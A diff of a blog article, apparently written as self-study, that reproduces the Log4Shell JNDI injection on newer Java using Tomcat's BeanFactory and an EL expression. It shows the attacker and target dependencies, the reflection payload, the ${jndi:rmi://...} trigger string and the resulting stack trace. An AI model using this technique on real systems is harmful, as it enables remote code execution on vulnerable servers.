@@ -54,12 +54,64 @@ java.lang.Exception
 
 Look at it: all bad things are happening deep inside Java internals. So, the landmine was placed long ago by Sun Microsystems in [RFC 2713](https://www.rfc-editor.org/info/rfc2713/). I am not an expert in the LDAP protocol, but it seems to me a very strange idea to download bytecode from an LDAP server and run it. 
 
-So, until [Java 8u191 released in 2018](https://bugzilla.redhat.com/show_bug.cgi?id=1639834) Log4Shell exploit was available even for kids. But as it was [explained here in 2019](https://www.veracode.com/blog/research/exploiting-jndi-injections-java) - this is not a complete solution.
+So, until [Java 8u191 released in 2018](https://bugzilla.redhat.com/show_bug.cgi?id=1639834) Log4Shell exploit was available even for kids. But as [Veracode team explained in 2019](https://www.veracode.com/blog/research/exploiting-jndi-injections-java) - this is not a complete solution.
 
+To reproduce the exploit I added dependency `implementation("org.apache.tomcat:tomcat-catalina:8.0.1")` for attacker RMI server - this is good enough for importing `org.apache.naming.ResourceRef`.
 
-3 more related CVEs were discovered in Log4j [CVE-2021-45046](https://nvd.nist.gov/vuln/detail/cve-2021-45046), [CVE-2021-44832](https://nvd.nist.gov/vuln/detail/cve-2021-44832) and [CVE-2021-45105](https://nvd.nist.gov/vuln/detail/cve-2021-45105) but it didn't do such a big impact.
+For the target I added dependencies 
+```
+    implementation("org.apache.tomcat:tomcat-catalina:8.5.20")
+    implementation("org.apache.tomcat:tomcat-jasper-el:8.5.20")
+```
+
+For the RCE I create `ClassThatPrintsExceptionInConstructor` and modified attacker part for it: 
+
+```java
+	ref.add(new StringRefAddr("x", "\"\".getClass().forName(\"ClassThatPrintsExceptionInConstructor\").newInstance()"));
+```
+
+After this changes 
+
+```java
+	logger.error("${jndi:rmi://127.0.0.1:1097/Object}");
+```
+gives the following stack trace for Java 11:
+
+```
+java.lang.Exception
+	at ClassThatPrintsExceptionInConstructor.<init>(ClassThatPrintsExceptionInConstructor.java:4)
+	at java.base/jdk.internal.reflect.NativeConstructorAccessorImpl.newInstance0(Native Method)
+	at java.base/jdk.internal.reflect.NativeConstructorAccessorImpl.newInstance(NativeConstructorAccessorImpl.java:62)
+	at java.base/jdk.internal.reflect.DelegatingConstructorAccessorImpl.newInstance(DelegatingConstructorAccessorImpl.java:45)
+	at java.base/java.lang.reflect.Constructor.newInstance(Constructor.java:490)
+	at java.base/java.lang.Class.newInstance(Class.java:584)
+	at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
+	at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)
+	at java.base/jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
+	at java.base/java.lang.reflect.Method.invoke(Method.java:566)
+	at javax.el.BeanELResolver.invoke(BeanELResolver.java:158)
+	at javax.el.CompositeELResolver.invoke(CompositeELResolver.java:79)
+	at org.apache.el.parser.AstValue.getValue(AstValue.java:159)
+	at org.apache.el.ValueExpressionImpl.getValue(ValueExpressionImpl.java:184)
+	at javax.el.ELProcessor.getValue(ELProcessor.java:61)
+	at javax.el.ELProcessor.eval(ELProcessor.java:54)
+	at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
+	at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)
+	at java.base/jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
+	at java.base/java.lang.reflect.Method.invoke(Method.java:566)
+	at org.apache.naming.factory.BeanFactory.getObjectInstance(BeanFactory.java:211)
+	at java.naming/javax.naming.spi.NamingManager.getObjectInstance(NamingManager.java:341)
+	at jdk.naming.rmi/com.sun.jndi.rmi.registry.RegistryContext.decodeObject(RegistryContext.java:499)
+	at jdk.naming.rmi/com.sun.jndi.rmi.registry.RegistryContext.lookup(RegistryContext.java:139)
+	at java.naming/com.sun.jndi.toolkit.url.GenericURLContext.lookup(GenericURLContext.java:220)
+	at java.naming/javax.naming.InitialContext.lookup(InitialContext.java:409)
+	at org.apache.logging.log4j.core.net.JndiManager.lookup(JndiManager.java:172)
+```
+It also works for Java 11, but for Java 17 I didn't reproduce the exploit.
+
+3 more related CVEs were discovered in Log4j later: [CVE-2021-45046](https://nvd.nist.gov/vuln/detail/cve-2021-45046), [CVE-2021-44832](https://nvd.nist.gov/vuln/detail/cve-2021-44832) and [CVE-2021-45105](https://nvd.nist.gov/vuln/detail/cve-2021-45105), but the impact was not that huge.
 
 Remote code downloading in JNDI is permanently disabled in [Java 24](https://bugs.openjdk.org/browse/JDK-8338536).
 
-Why am I writing this article in 2026? Because I am looking for a job in Israel, and cybersecurity companies here are growing fast. So, I did this research to improve my skills. And it is clear why demand is growing for cybersecurity solutions: with AI, vulnerabilities can be exploited with at scale we have never seen before.
+Why am I writing this article in 2026? Because I am looking for a job in Israel, and cybersecurity companies here are growing fast. So, I did this research to improve my skills. And it is clear why demand is growing for cybersecurity solutions: against attackers with AI, we need much more serious defence.
 
